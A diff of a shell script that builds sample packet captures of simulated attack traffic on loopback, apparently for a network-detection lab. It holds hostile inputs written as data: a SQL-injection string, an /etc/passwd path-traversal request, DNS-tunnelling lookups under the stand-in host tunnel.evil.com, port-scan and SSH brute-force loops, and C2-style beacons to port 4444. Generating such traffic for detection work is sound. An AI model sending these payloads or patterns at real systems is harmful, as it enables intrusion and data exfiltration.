@@ -52,28 +52,25 @@ if [ $VALID_PCAPS -eq 3 ]; then
     echo "✓ All PCAP files found and valid:"
     ls -lh *.pcap
 else
-    # Create suspicious traffic
+    echo "✗ Missing or invalid PCAP files. Creating traffic captures..."
+    
+    # Ensure we have required tools
+    which nc >/dev/null 2>&1 || sudo apt-get install -y netcat-openbsd >/dev/null 2>&1
+    which curl >/dev/null 2>&1 || sudo apt-get install -y curl >/dev/null 2>&1
+    
+    # Clean up old files
+    rm -f suspicious_traffic.pcap normal_traffic.pcap sample_malware_conn.pcap 2>/dev/null
+    
+    # Create suspicious traffic with HTTP support
     echo "  Creating port scan traffic..."
     
     # Start a simple HTTP server for real HTTP traffic
     python3 -m http.server 8080 >/dev/null 2>&1 &
     HTTP_SERVER_PID=$!
-    
-    # Start a DNS server simulation (optional, for dns.log)
-    sudo python3 -c "
-import socket
-s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-s.bind(('127.0.0.1', 5353))
-while True:
-    try:
-        data, addr = s.recvfrom(1024)
-        s.sendto(b'DNS_RESPONSE', addr)
-    except: break
-" >/dev/null 2>&1 &
-    DNS_SIM_PID=$!
+    sleep 2
     
     # Start packet capture for suspicious traffic
-    sudo timeout 20 tcpdump -i lo -w suspicious_traffic.pcap >/dev/null 2>&1 &
+    sudo timeout 25 tcpdump -i lo -w suspicious_traffic.pcap >/dev/null 2>&1 &
     TCPDUMP_PID=$!
     sleep 2
     
@@ -82,59 +79,48 @@ while True:
         (timeout 0.1 nc -zv 127.0.0.1 $port 2>/dev/null || true) &
     done
     
-    # SSH brute force simulation (rapid connections to port 22)
+    # SSH brute force simulation
     echo "  Creating SSH brute force attempts..."
     for i in {1..20}; do
         (echo "SSH-2.0-Test" | timeout 0.1 nc 127.0.0.1 22 2>/dev/null || true) &
     done
     
-    # HTTP with SQL injection using curl (creates proper HTTP log)
+    # HTTP with SQL injection using curl
     echo "  Creating HTTP attack patterns..."
-    sleep 2  # Let HTTP server start
-    curl -s "http://127.0.0.1:8080/login.php?user=admin'+OR+'1'='1" >/dev/null 2>&1 &
-    curl -s "http://127.0.0.1:8080/../../../../etc/passwd" >/dev/null 2>&1 &
-    curl -s "http://127.0.0.1:8080/admin.php" -H "User-Agent: " >/dev/null 2>&1 &
-    curl -s "http://127.0.0.1:8080/test" >/dev/null 2>&1 &
+    curl -s "http://127.0.0.1:8080/login.php?user=admin'+OR+'1'='1" >/dev/null 2>&1 || true
+    curl -s "http://127.0.0.1:8080/../../../../etc/passwd" >/dev/null 2>&1 || true
+    curl -s "http://127.0.0.1:8080/admin.php" -H "User-Agent: " >/dev/null 2>&1 || true
+    curl -s "http://127.0.0.1:8080/test" >/dev/null 2>&1 || true
     
-    # DNS patterns using dig
+    # DNS patterns
     echo "  Creating DNS tunneling patterns..."
-    which dig >/dev/null 2>&1 && {
-        for i in {1..5}; do
-            dig @127.0.0.1 -p 5353 "verylongsubdomainxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx$i.tunnel.evil.com" +short >/dev/null 2>&1 &
-        done
-    }
-    
-    # Normal DNS queries too
-    which nslookup >/dev/null 2>&1 && {
-        for domain in google.com facebook.com; do
-            nslookup $domain 127.0.0.1 >/dev/null 2>&1 &
-        done
-    }
+    for i in {1..5}; do
+        (nslookup "verylongsubdomainxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx$i.tunnel.evil.com" 127.0.0.1 2>/dev/null || true) &
+    done
     
     # Wait for traffic generation
     sleep 5
     
-    # Stop capture and servers
+    # Stop capture
     sudo kill $TCPDUMP_PID 2>/dev/null
     wait $TCPDUMP_PID 2>/dev/null
     kill $HTTP_SERVER_PID 2>/dev/null
-    sudo kill $DNS_SIM_PID 2>/dev/null
-    
-write_pcap('suspicious_traffic.pcap', packets)
-print("    Created suspicious_traffic.pcap with Python")
-PYTHON_EOF
-    fi
     
     # Create normal traffic
     echo "  Creating normal web traffic..."
-    sudo timeout 10 tcpdump -i lo -w normal_traffic.pcap >/dev/null 2>&1 &
+    
+    # Start HTTP server again
+    python3 -m http.server 8080 >/dev/null 2>&1 &
+    HTTP_SERVER_PID=$!
+    sleep 2
+    
+    sudo timeout 15 tcpdump -i lo -w normal_traffic.pcap >/dev/null 2>&1 &
     TCPDUMP_PID=$!
     sleep 2
     
     # Normal HTTP traffic
     for i in {1..10}; do
-        (echo -e "GET /index.html HTTP/1.1\r\nHost: www.example.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n" | \
-            timeout 0.2 nc 127.0.0.1 80 2>/dev/null || true) &
+        curl -s "http://127.0.0.1:8080/index.html" -H "User-Agent: Mozilla/5.0" >/dev/null 2>&1 || true
     done
     
     # Normal DNS
@@ -145,6 +131,7 @@ PYTHON_EOF
     sleep 3
     sudo kill $TCPDUMP_PID 2>/dev/null
     wait $TCPDUMP_PID 2>/dev/null
+    kill $HTTP_SERVER_PID 2>/dev/null
     
     # Create C2 beacon traffic
     echo "  Creating C2 beacon traffic..."
@@ -154,8 +141,7 @@ PYTHON_EOF
     
     # Regular beacon pattern
     for i in {1..10}; do
-        (echo "BEACON:$(printf '%04d' $i):STATUS" | \
-            timeout 0.2 nc 127.0.0.1 4444 2>/dev/null || true) &
+        (echo "BEACON:$(printf '%04d' $i):STATUS" | timeout 0.2 nc 127.0.0.1 4444 2>/dev/null || true) &
         sleep 0.5
     done
     
@@ -167,7 +153,6 @@ PYTHON_EOF
     for pcap in suspicious_traffic.pcap normal_traffic.pcap sample_malware_conn.pcap; do
         if [ ! -f "$pcap" ] || [ ! -s "$pcap" ]; then
             echo "  Warning: $pcap missing or empty, creating minimal valid file..."
-            # Create minimal valid PCAP with header
             printf '\xd4\xc3\xb2\xa1\x02\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x00\x00\x01\x00\x00\x00' > $pcap
         fi
         SIZE=$(stat -c%s "$pcap" 2>/dev/null || echo "0")
